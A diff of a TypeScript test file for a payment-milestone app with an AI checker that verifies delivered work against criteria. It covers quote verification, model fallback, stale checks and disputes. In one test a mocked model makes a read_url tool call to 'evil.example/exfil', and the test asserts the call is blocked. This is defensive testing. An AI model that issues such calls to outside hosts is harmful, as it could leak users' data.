@@ -2,8 +2,8 @@ import { afterAll, beforeAll, beforeEach, describe, expect, it } from "vitest";
 import type { Server } from "node:http";
 import { eq } from "drizzle-orm";
 import { MockLanguageModelV4 } from "ai/test";
-import { auditEvents, verdicts, toolCalls, disputes } from "@/lib/db/schema";
-import { runCheck, draftChangeNote } from "@/lib/ai/checker";
+import { auditEvents, checks, verdicts, toolCalls, disputes } from "@/lib/db/schema";
+import { STALE_CHECK_MS, draftChangeNote, failStaleChecks, runCheck } from "@/lib/ai/checker";
 import { setModelForTests } from "@/lib/ai/model";
 import { createSampleProject, sampleLinks } from "@/lib/sample";
 import { submitDelivery } from "@/lib/services/deliveries";
@@ -21,6 +21,7 @@ import {
 import { approveAndSubmitDispute, handleWebhook, milestoneDisputes, syncDisputes } from "@/lib/services/disputes";
 import { FAKE_NONCES, type FakeRail } from "@/lib/payments/fake-rail";
 import type { DB } from "@/lib/db";
+import { OWNER_WORKSPACE_ID as OWNER } from "@/lib/services/workspaces";
 import { freshWorld, startStaticServer, tamper } from "./helpers";
 
 let server: Server;
@@ -35,7 +36,7 @@ beforeEach(async () => {
 });
 
 async function firstMilestone() {
-  const p = await createSampleProject(db);
+  const p = await createSampleProject(db, OWNER);
   const [m] = await projectMilestones(db, p.id);
   return m;
 }
@@ -125,7 +126,7 @@ describe("the full loop on the fake rail with the scripted checker", () => {
   it("reconcile notices an expired hold", async () => {
     const m = await firstMilestone();
     await fundMilestone(db, rail, m.id, { nonce: FAKE_NONCES.card });
-    rail.advanceClock(8 * 24 * 60 * 60 * 1000);
+    await rail.advanceClock(8 * 24 * 60 * 60 * 1000);
     const r = await reconcileMilestone(db, rail, m.id);
     expect(r.remote).toBe("authorization_expired");
     expect((await getMilestone(db, m.id)).state).toBe("hold_expired");
@@ -135,52 +136,135 @@ describe("the full loop on the fake rail with the scripted checker", () => {
 });
 
 describe("AI checker with a model (mocked, deterministic)", () => {
-  it("keeps real quotes, drops invented ones, and ignores injected instructions", async () => {
+  it("judges each criterion separately, keeps real quotes, drops invented ones, records progress", async () => {
     const m = await firstMilestone();
     await fundMilestone(db, rail, m.id, { nonce: FAKE_NONCES.card });
     const d = await submitDelivery(db, m.id, { links: sampleLinks(1), notes: "", files: [] });
-    const judged = {
-      summary: "Two of four criteria are met.",
-      results: [
-        { criterionId: "c1", verdict: "met", reasoning: "Headline is there.", evidence: [{ source: sampleLinks(1)[0], quote: "Larkspur Pottery Studio" }] },
-        // Invented quote: not on the page. Must be dropped and the verdict downgraded.
-        { criterionId: "c2", verdict: "met", reasoning: "Saturday class listed.", evidence: [{ source: sampleLinks(1)[0], quote: "Saturday wheel-throwing class, start time 10:00" }] },
-        { criterionId: "c3", verdict: "not_met", reasoning: "No address on the page.", evidence: [] },
-        { criterionId: "c4", verdict: "met", reasoning: "Signup form present.", evidence: [{ source: "anything", quote: "Join the waitlist with this signup form:" }] },
-      ],
+    const page = sampleLinks(1)[0];
+    const byCriterion: Record<string, object> = {
+      headline: { verdict: "met", reasoning: "Headline is there.", evidence: [{ source: page, quote: "Larkspur Pottery Studio" }] },
+      // Invented quote: not on the page. Must be dropped and the verdict downgraded.
+      Saturday: { verdict: "met", reasoning: "Saturday class listed.", evidence: [{ source: page, quote: "Saturday wheel-throwing class, start time 10:00" }] },
+      address: { verdict: "not_met", reasoning: "No address on the page.", evidence: [] },
+      waitlist: { verdict: "met", reasoning: "Signup form present.", evidence: [{ source: "anything", quote: "Join the waitlist with this signup form:" }] },
     };
-    let call = 0;
-    const usage = { inputTokens: { total: 1, noCache: 1, cacheRead: undefined, cacheWrite: undefined }, outputTokens: { total: 1, text: 1, reasoning: undefined } };
-    const model = new MockLanguageModelV4({
-      doGenerate: async (opts) => {
-        call++;
-        if (call === 1) {
-          // Exploration step: the model asks for one more read through a tool.
-          expect(opts.tools?.map((t) => t.name).sort()).toEqual(["github_file", "github_repo", "read_file", "read_url"]);
-          return { content: [{ type: "tool-call", toolCallId: "t1", toolName: "read_url", input: JSON.stringify({ url: "https://evil.example/exfil" }) }], finishReason: { unified: "tool-calls", raw: undefined }, usage, warnings: [] };
-        }
-        if (call === 2) return { content: [{ type: "text", text: "DONE" }], finishReason: { unified: "stop", raw: undefined }, usage, warnings: [] };
-        return { content: [{ type: "text", text: JSON.stringify(judged) }], finishReason: { unified: "stop", raw: undefined }, usage, warnings: [] };
-      },
+    const model = mockJudge((prompt) => {
+      const key = Object.keys(byCriterion).find((k) => prompt.includes(`Criterion: `) && prompt.split("\n")[0].includes(k));
+      return byCriterion[key!];
     });
-    setModelForTests({ model, label: "mock/test" });
+    setModelForTests({ model: model.model, label: "mock/test" });
     const checkId = await runCheck(db, m.id, d);
+    expect(model.calls()).toBe(4); // one judge call per criterion, no exploration for a page without links
     const vs = await verdictsFor(m.id);
     const byPos = (n: number) => vs[n - 1];
-    expect(vs).toHaveLength(4);
     expect(byPos(1).verdict).toBe("met");
     expect(byPos(2).verdict).toBe("needs_person");
-    expect(byPos(2).evidence).toHaveLength(0);
     expect(byPos(2).note).toMatch(/could not be found/);
-    expect(byPos(4).evidence[0].source).toBe(sampleLinks(1)[0]);
+    expect(byPos(3).verdict).toBe("not_met");
+    expect(byPos(4).evidence[0].source).toBe(page);
     const check = await latestCheck(db, m.id);
+    expect(check!.id).toBe(checkId);
     expect(check!.droppedEvidence).toBe(1);
+    expect(check!.fallbackReason).toBeNull();
+    expect(check!.model).toBe("mock/test");
+    expect(check!.progress!.phase).toBe("saving");
+    expect(Object.values(check!.progress!.criteria)).toEqual(["done", "done", "done", "done"]);
+    expect(check!.progress!.reading[0]).toContain("read_url");
+  });
+
+  it("explores linked pages with tools, and blocks hosts outside the delivery", async () => {
+    const m = await firstMilestone();
+    await fundMilestone(db, rail, m.id, { nonce: FAKE_NONCES.card });
+    const d = await submitDelivery(db, m.id, { links: [`${origin}/samples/eval/prices-wrong/index.html`], notes: "", files: [] });
+    let explored = 0;
+    const model = mockJudge(
+      () => ({ verdict: "not_met", reasoning: "Not shown.", evidence: [] }),
+      (n) => {
+        explored++;
+        if (n === 0) return { type: "tool-call", toolCallId: "t1", toolName: "read_url", input: JSON.stringify({ url: "https://evil.example/exfil" }) };
+        if (n === 1) return { type: "tool-call", toolCallId: "t2", toolName: "read_url", input: JSON.stringify({ url: `${origin}/samples/larkspur-v2/index.html` }) };
+        return { type: "text", text: "DONE" };
+      },
+    );
+    setModelForTests({ model: model.model, label: "mock/test" });
+    const checkId = await runCheck(db, m.id, d);
+    expect(explored).toBeGreaterThanOrEqual(3);
     const calls = await db.select().from(toolCalls).where(eq(toolCalls.checkId, checkId));
-    const blocked = calls.find((c) => c.input.includes("evil.example"));
-    expect(blocked?.ok).toBe(false);
-    expect(blocked?.output).toMatch(/Blocked/);
+    expect(calls.find((c) => c.input.includes("evil.example"))?.output).toMatch(/Blocked/);
+    expect(calls.find((c) => c.input.includes("larkspur-v2"))?.ok).toBe(true);
+  });
+
+  it("falls back to the scripted checker, with the reason, when the model fails", async () => {
+    const m = await firstMilestone();
+    await fundMilestone(db, rail, m.id, { nonce: FAKE_NONCES.card });
+    const d = await submitDelivery(db, m.id, { links: sampleLinks(2), notes: "", files: [] });
+    const model = new MockLanguageModelV4({ doGenerate: async () => { throw new Error("upstream 503"); } });
+    setModelForTests({ model, label: "mock/test" });
+    await runCheck(db, m.id, d);
+    const check = await latestCheck(db, m.id);
+    expect(check!.status).toBe("done");
+    expect(check!.model).toBe("scripted");
+    expect(check!.fallbackReason).toMatch(/The AI model failed/);
+    expect(check!.summary).toMatch(/scripted checker ran instead/);
+    expect((await verdictsFor(m.id)).every((v) => v.verdict === "met")).toBe(true);
+  });
+
+  it("falls back to the scripted checker when the demo workspace's daily AI cap is used up", async () => {
+    const w = await freshWorld({ APP_URL: origin, AI_PROVIDER: "scripted", LIMIT_AI_CHECKS_PER_WORKSPACE: 1 });
+    db = w.db;
+    rail = w.rail;
+    const demo = w.demo;
+    const p = await createSampleProject(db, demo.id);
+    const [m] = await projectMilestones(db, p.id);
+    await fundMilestone(db, rail, m.id, { nonce: FAKE_NONCES.card });
+    const model = mockJudge(() => ({ verdict: "met", reasoning: "ok", evidence: [{ source: "x", quote: "Larkspur Pottery Studio" }] }));
+    setModelForTests({ model: model.model, label: "mock/test" });
+    const d1 = await submitDelivery(db, m.id, { links: sampleLinks(1), notes: "", files: [] });
+    await runCheck(db, m.id, d1);
+    expect((await latestCheck(db, m.id))!.model).toBe("mock/test");
+    await requestChanges(db, m.id, "again please");
+    const d2 = await submitDelivery(db, m.id, { links: sampleLinks(2), notes: "", files: [] });
+    await runCheck(db, m.id, d2);
+    const second = await latestCheck(db, m.id);
+    expect(second!.model).toBe("scripted");
+    expect(second!.fallbackReason).toMatch(/used its 1 AI checks for today/);
+  });
+
+  it("marks a check that never finished as failed and frees the milestone", async () => {
+    const m = await firstMilestone();
+    await fundMilestone(db, rail, m.id, { nonce: FAKE_NONCES.card });
+    const d = await submitDelivery(db, m.id, { links: sampleLinks(2), notes: "", files: [] });
+    await db.insert(checks).values({ id: "chk_stuck", milestoneId: m.id, deliveryId: d, status: "running", model: "x", startedAt: new Date(Date.now() - STALE_CHECK_MS - 1000) });
+    await failStaleChecks(db, m.id);
+    expect((await getMilestone(db, m.id)).state).toBe("funded");
+    const [c] = await db.select().from(checks).where(eq(checks.id, "chk_stuck"));
+    expect(c.status).toBe("failed");
   });
 });
+
+type GenOptions = { prompt: { role: string; content: unknown }[]; tools?: unknown[] };
+
+const usage = { inputTokens: { total: 1, noCache: 1, cacheRead: undefined, cacheWrite: undefined }, outputTokens: { total: 1, text: 1, reasoning: undefined } };
+
+/** A mock model: judge calls (no tools) get `judge(prompt)`; exploration calls (with tools) get `explore(step)`. */
+function mockJudge(judge: (prompt: string) => object, explore?: (step: number) => Record<string, unknown>) {
+  let calls = 0;
+  let step = 0;
+  const model = new MockLanguageModelV4({
+    doGenerate: (async (opts: GenOptions) => {
+      calls++;
+      const prompt = JSON.stringify(opts.prompt.filter((m) => m.role === "user").map((m) => m.content));
+      const text = prompt.replace(/\\n/g, "\n");
+      if (opts.tools?.length) {
+        const part = explore ? explore(step++) : { type: "text", text: "DONE" };
+        return { content: [part as never], finishReason: { unified: part.type === "tool-call" ? "tool-calls" : "stop", raw: undefined }, usage, warnings: [] };
+      }
+      const body = text.slice(text.indexOf("Criterion: "));
+      return { content: [{ type: "text", text: JSON.stringify(judge(body)) }], finishReason: { unified: "stop", raw: undefined }, usage, warnings: [] };
+    }) as never,
+  });
+  return { model, calls: () => calls };
+}
 
 describe("webhooks and dispute defence", () => {
   async function releasedWithDisputeCard() {
@@ -199,7 +283,7 @@ describe("webhooks and dispute defence", () => {
 
   it("opens a dispute from a signed webhook, drafts evidence, dedupes repeats", async () => {
     const m = await releasedWithDisputeCard();
-    rail.openDisputeFor(m.transactionId!);
+    await rail.openDisputeFor(m.transactionId!);
     const s = await rail.sampleWebhook("dispute_opened", m.transactionId!);
     const r1 = await handleWebhook(db, rail, s.signature, s.payload);
     expect(r1.outcome).toMatch(/dispute .* open/);
